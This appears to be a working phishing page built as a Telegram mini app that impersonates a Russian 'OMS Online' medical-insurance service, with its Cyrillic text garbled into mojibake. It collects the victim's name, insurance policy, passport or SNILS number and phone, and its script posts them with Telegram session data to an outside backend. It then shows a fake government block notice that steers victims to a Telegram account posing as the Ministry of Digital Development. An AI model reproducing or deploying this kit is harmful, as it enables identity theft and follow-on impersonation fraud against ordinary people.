<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–û–ú–° –û–Ω–ª–∞–π–Ω</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Inter', system-ui, sans-serif; 
            background-color: #f4f7f9;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .main-card {
            width: 92%;
            max-width: 440px;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.03), 0 4px 6px rgba(0, 0, 0, 0.02);
            overflow: hidden;
        }

        .hidden { display: none !important; }
        .fade-in { animation: fadeIn 0.4s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* –ü—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä */
        .step-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: #e2e8f0;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        .step-dot.active { background-color: #3b82f6; width: 24px; }
        
        .step-dot.completed { 
            background-color: #22c55e !important; 
            width: 8px !important; 
        }

        .option-card { border: 2px solid #f1f5f9; transition: all 0.2s ease; cursor: pointer; }
        .option-card:active { transform: scale(0.97); border-color: #3b82f6; background-color: #eff6ff; }

        .input-field { background-color: #f8fafc; border: 2px solid #f1f5f9; transition: all 0.3s ease; }
        .input-field:focus { background-color: #ffffff; border-color: #3b82f6; outline: none; }

        .blink-red-border { animation: blinkBorder 2s infinite; border: 2px solid transparent; }
        @keyframes blinkBorder {
            0%, 100% { border-color: rgba(239, 68, 68, 0.1); background-color: #ffffff; }
            50% { border-color: rgba(239, 68, 68, 0.5); background-color: #fff5f5; }
        }
    </style>
</head>
<body>

<div class="main-card p-8 md:p-10">
    
    <div id="progressDots" class="flex justify-center gap-2 mb-10 hidden">
        <div class="step-dot"></div>
        <div class="step-dot"></div>
        <div class="step-dot"></div>
        <div class="step-dot"></div>
        <div class="step-dot"></div>
        <div class="step-dot"></div>
    </div>

    <div id="welcome" class="fade-in text-center">
        <div class="w-20 h-20 bg-blue-50 text-blue-600 rounded-3xl flex items-center justify-center mx-auto mb-6 text-4xl">‚ò§</div>
        <h1 class="text-2xl font-bold text-slate-900 mb-4">–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ!</h1>
        <p class="text-slate-500 mb-8">–Ø —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–º–æ—â–Ω–∏–∫ ¬´–û–ú–° –û–Ω–ª–∞–π–Ω¬ª. –î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –º–µ–¥–∏—Ü–∏–Ω—Å–∫–æ–π –ø–æ–º–æ—â–∏ –≤–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω—ã.<br>–≠—Ç–æ –∑–∞–π–º—ë—Ç –≤—Å–µ–≥–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç.</p>
        <button onclick="show('step1')" class="w-full bg-blue-600 text-white py-4 rounded-2xl text-lg font-semibold shadow-lg">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <div id="step1" class="hidden fade-in">
        <h3 class="text-xl font-bold text-slate-900 mb-6 text-center">–í–∞—à –ø–æ–ª</h3>
        <div class="grid grid-cols-1 gap-4">
            <div onclick="save('gender', '–ú—É–∂—Å–∫–æ–π'); show('step2')" 
                 class="option-card p-5 rounded-2xl flex justify-between items-center bg-blue-50/50 border-blue-100 hover:border-blue-400 hover:bg-blue-50 transition-all">
                <span class="text-lg font-semibold text-blue-700">–ú—É–∂—Å–∫–æ–π</span>
                <span class="text-2xl text-blue-300"></span>
            </div>
            
            <div onclick="save('gender', '–ñ–µ–Ω—Å–∫–∏–π'); show('step2')" 
                 class="option-card p-5 rounded-2xl flex justify-between items-center bg-pink-50/50 border-pink-100 hover:border-pink-400 hover:bg-pink-50 transition-all">
                <span class="text-lg font-semibold text-pink-700">–ñ–µ–Ω—Å–∫–∏–π</span>
                <span class="text-2xl text-pink-300"></span>
            </div>
        </div>
    </div>

    <div id="step2" class="hidden fade-in text-center">
        <h3 class="text-xl font-bold text-slate-900 mb-6">–í–∞—à–µ –§–ò–û</h3>
        <input id="name" type="text" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" class="input-field w-full p-5 rounded-2xl text-lg mb-6 text-center" />
        <button onclick="saveInput('name', 'step3')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold">–î–∞–ª–µ–µ</button>
    </div>

    <div id="step3" class="hidden fade-in text-center">
        <h3 class="text-xl font-bold text-slate-900 mb-6">–ù–æ–º–µ—Ä –ø–æ–ª–∏—Å–∞ –û–ú–°</h3>
        <input id="polis" type="tel" inputmode="numeric" placeholder="16 —Ü–∏—Ñ—Ä" maxlength="16" class="input-field w-full p-5 rounded-2xl text-lg mb-6 text-center tracking-widest" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 16);" />
        <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
    </div>

    <div id="step4" class="hidden fade-in text-center">
        <h3 class="text-xl font-bold text-slate-900 mb-6">–í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="grid grid-cols-1 gap-3 text-left">
            <div onclick="setDocType('–ü–∞—Å–ø–æ—Ä—Ç')" class="option-card p-5 rounded-2xl font-medium">–ü–∞—Å–ø–æ—Ä—Ç –†–§</div>
            <div onclick="setDocType('–°–ù–ò–õ–°')" class="option-card p-5 rounded-2xl font-medium">–°–ù–ò–õ–°</div>
        </div>
    </div>

    <div id="step5" class="hidden fade-in text-center">
        <h3 id="docTitle" class="text-xl font-bold text-slate-900 mb-6">–ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <input id="docNumber" type="tel" inputmode="numeric" class="input-field w-full p-5 rounded-2xl text-lg mb-2 text-center tracking-widest" oninput="limitDocInput(this)" />
        <p id="docError" class="text-red-500 text-xs mb-6 hidden font-medium"></p>
        <button onclick="validateDoc()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <div id="step6" class="hidden fade-in text-center">
        <h3 class="text-xl font-bold text-slate-900 mb-6">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <input id="phone" type="tel" inputmode="numeric" placeholder="+7 (___) ___-__-__" class="input-field w-full p-5 rounded-2xl text-lg mb-6 text-center" oninput="formatPhone(this)" maxlength="18" />
        <button onclick="saveInput('phone', 'check')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold">–ö –ø—Ä–æ–≤–µ—Ä–∫–µ</button>
    </div>

    <div id="check" class="hidden fade-in">
        <h2 class="text-2xl font-bold mb-6 text-center text-slate-900">–í—Å—ë –≤–µ—Ä–Ω–æ?</h2>
        <div class="bg-slate-50 p-6 rounded-2xl mb-8 space-y-4 border border-slate-100 text-sm">
            <div class="flex justify-between border-b border-slate-200 pb-2"><span class="text-slate-400">–ü–æ–ª:</span><b id="prevGender"></b></div>
            <div class="flex justify-between border-b border-slate-200 pb-2"><span class="text-slate-400">–§–ò–û:</span><b id="prevName"></b></div>
            <div class="flex justify-between border-b border-slate-200 pb-2"><span class="text-slate-400">–ü–æ–ª–∏—Å:</span><b id="prevPolis"></b></div>
            <div class="flex justify-between border-b border-slate-200 pb-2"><span class="text-slate-400">–î–æ–∫—É–º–µ–Ω—Ç:</span><b id="prevDoc"></b></div>
            <div class="flex justify-between"><span class="text-slate-400">–¢–µ–ª–µ—Ñ–æ–Ω:</span><b id="prevPhone"></b></div>
        </div>
        <div class="flex gap-3">
            <button onclick="show('step6')" class="w-1/3 bg-slate-100 text-slate-500 py-4 rounded-2xl font-bold">–ù–∞–∑–∞–¥</button>
            <button onclick="startFinish()" class="w-2/3 bg-green-600 text-white py-4 rounded-2xl font-bold shadow-lg shadow-green-100">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>
    </div>

    <div id="loading" class="hidden fade-in text-center">
        <div class="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-6"></div>
        <h2 class="text-xl font-bold text-slate-800">–û–±—Ä–∞–±–æ—Ç–∫–∞...</h2>
    </div>

    <div id="blocked" class="hidden fade-in text-center p-6 rounded-[2.5rem] blink-red-border">
        <div class="text-5xl mb-6">üö´</div>
        <h1 class="text-xl font-black text-red-600 mb-4 uppercase tracking-tighter">–ë–æ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω</h1>
        <p class="text-sm text-slate-600 leading-relaxed mb-8">
            <b>–î–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ú–∏–Ω–∏—Å—Ç–µ—Ä—Å—Ç–≤–æ–º —Å–≤—è–∑–∏ –∏ –º–∞—Å—Å–æ–≤—ã—Ö –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏–π –†–æ—Å—Å–∏–π—Å–∫–æ–π –§–µ–¥–µ—Ä–∞—Ü–∏–∏, –≤ —Å–≤—è–∑–∏ —Å –ø–µ—Ä–µ—Å—ã–ª–∫–æ–π –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö:</b> –° –≤–∞–º–∏ –≤ —Å–∫–æ—Ä–æ–º –≤—Ä–µ–º–µ–Ω–∏ –¥–æ–ª–∂–Ω—ã —Å–≤—è–∑–∞—Ç—å—Å—è –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–∏ –ú–∏–Ω—Ü–∏—Ñ—Ä –†–æ—Å—Å–∏–∏.<br>–ß—Ç–æ–±—ã —É—Å–∫–æ—Ä–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å, –Ω–∞–ø–∏—à–∏—Ç–µ –æ–±—Ä–∞—â–µ–Ω–∏–µ –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç –ú–∏–Ω—Ü–∏—Ñ—Ä –†–æ—Å—Å–∏–∏, –Ω–∞–∂–∞–≤ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.
        </p>
        <a id="supportBtn" href="#" class="block w-full bg-slate-900 text-white py-4 rounded-2xl font-bold shadow-xl">–ß–∞—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏</a>
    </div>

</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    const urlParams = new URLSearchParams(window.location.search);
    const botSource = urlParams.get('bot') || 'unknown';

    document.getElementById('supportBtn').href = `https://t.me/mincfr_official?text=${encodeURIComponent("–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ! –ú–æ–∏ –¥–∞–Ω–Ω—ã–µ –ø–æ–ø–∞–ª–∏ –≤ –æ–±—â–∏–π –¥–æ—Å—Ç—É–ø, –ø—Ä–æ–∏–∑–æ—à–ª–æ –º–æ—à–µ–Ω–Ω–∏—á–µ—Å—Ç–≤–æ! –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–º–æ—â—å —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞ –æ–Ω–ª–∞–π–Ω-–ø–æ–¥–¥–µ—Ä–∂–∫–∏!")}`;

    let answers = {};

    // –ü–†–û–í–ï–†–ö–ê –ü–û–í–¢–û–†–ù–û–ô –†–ï–ì–ò–°–¢–†–ê–¶–ò–ò –ü–†–ò –ó–ê–ì–†–£–ó–ö–ï
    window.onload = async () => {
        if (tg.initData) {
            try {
                const res = await fetch('https://oms-mini-app-backend-production.up.railway.app/check_user', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ initDataRaw: tg.initData })
                });
                const result = await res.json();
                if (result.is_blocked) show('blocked');
            } catch (e) { console.error("Check fail"); }
        }
    };

    function updateDots(stepId) {
        const dotsContainer = document.getElementById('progressDots');
        const dots = document.querySelectorAll('.step-dot');
        
        if (stepId.startsWith('step') || stepId === 'check') {
            dotsContainer.classList.remove('hidden');
            let stepNum = parseInt(stepId.replace('step', ''));
            
            dots.forEach((dot, idx) => {
                const currentIdx = idx + 1;
                dot.classList.remove('active', 'completed');
                
                if (stepId === 'check') {
                    dot.classList.add('completed');
                } else {
                    if (currentIdx === stepNum) dot.classList.add('active');
                }
            });
        } else {
            dotsContainer.classList.add('hidden');
        }
    }

    function show(id) {
        document.querySelectorAll('.main-card > div:not(#progressDots)').forEach(el => el.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
        updateDots(id);
        
        if (id === 'check') {
            document.getElementById('prevGender').textContent = answers.gender || '‚Äî';
            document.getElementById('prevName').textContent = answers.name || '‚Äî';
            document.getElementById('prevPolis').textContent = answers.polis || '‚Äî';
            document.getElementById('prevDoc').textContent = `${answers.docType}: ${answers.docNumber}`;
            document.getElementById('prevPhone').textContent = answers.phone || '‚Äî';
        }
        
        if (id === 'blocked') {
            document.getElementById('progressDots').classList.add('hidden');
        }
    }

    function save(key, value) { answers[key] = value; tg.HapticFeedback.impactOccurred('light'); }
    function saveInput(id, next) {
        const val = document.getElementById(id).value.trim();
        if (!val) { tg.HapticFeedback.notificationOccurred('error'); return; }
        save(id, val); show(next);
    }
    function setDocType(type) {
        save('docType', type);
        document.getElementById('docNumber').value = '';
        document.getElementById('docTitle').innerText = type === '–ü–∞—Å–ø–æ—Ä—Ç' ? '–ü–∞—Å–ø–æ—Ä—Ç –†–§' : '–°–ù–ò–õ–°';
        show('step5');
    }
    function limitDocInput(input) {
        const limit = answers.docType === '–ü–∞—Å–ø–æ—Ä—Ç' ? 10 : 11;
        input.value = input.value.replace(/[^0-9]/g, '').slice(0, limit);
    }
    function validateDoc() {
        const val = document.getElementById('docNumber').value;
        const exp = answers.docType === '–ü–∞—Å–ø–æ—Ä—Ç' ? 10 : 11;
        if (val.length !== exp) { 
            document.getElementById('docError').classList.remove('hidden'); 
            tg.HapticFeedback.notificationOccurred('error'); 
            return; 
        }
        save('docNumber', val); show('step6');
    }
    function formatPhone(input) {
        let v = input.value.replace(/\D/g, '');
        if (v.startsWith('7') || v.startsWith('8')) v = v.substring(1);
        let res = '+7';
        if (v.length > 0) res += ' (' + v.substring(0, 3);
        if (v.length > 3) res += ') ' + v.substring(3, 6);
        if (v.length > 6) res += '-' + v.substring(6, 8);
        if (v.length > 8) res += '-' + v.substring(8, 10);
        input.value = res.substring(0, 18);
    }
    async function startFinish() { show('loading'); await new Promise(r => setTimeout(r, 2000)); finish(); }
    function finish() {
        fetch('https://oms-mini-app-backend-production.up.railway.app/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...answers, initDataRaw: tg.initData, bot_label: botSource })
        }).finally(() => { tg.HapticFeedback.notificationOccurred('warning'); show('blocked'); });
    }
</script>
</body>
</html>
